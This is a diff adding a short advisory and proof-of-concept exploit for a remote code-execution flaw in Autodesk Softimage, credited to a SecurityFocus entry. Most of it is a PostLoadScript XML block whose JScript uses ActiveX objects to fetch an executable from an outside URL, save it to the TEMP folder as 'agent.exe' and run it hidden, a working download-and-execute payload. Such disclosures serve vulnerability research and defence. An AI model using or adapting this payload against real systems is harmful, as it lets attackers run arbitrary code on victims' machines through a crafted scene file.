@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/36637/info
+
+Autodesk Softimage is prone to a remote code-execution vulnerability.
+
+Successful exploits will allow attackers to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition. 
+
+<PostLoadScript>
+      <Language>JScript</Language>
+      <Function></Function>
+      <Script_Content>
+    <![cdata[
+var s=new ActiveXObject('WScript.Shell');
+var o=new ActiveXObject('ADODB.Stream');
+var e=s.Environment('Process');
+var u='http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';
+var b=e.Item('TEMP')+'agent.exe';
+var x=new ActiveXObject('Microsoft.XMLHTTP');
+//x=new ActiveXObject('MSXML2.ServerXMLHTTP');
+if(!x)
+    exit(0);
+x.open('GET',u,0);
+x.send(null);
+o.Type=1;
+o.Mode=3;
+o.Open();
+o.Write(x.responseBody);
+o.SaveToFile(b,2);
+s.Run(b,0);
+    ]] >
+  </Script_Content>
+  </PostLoadScript>
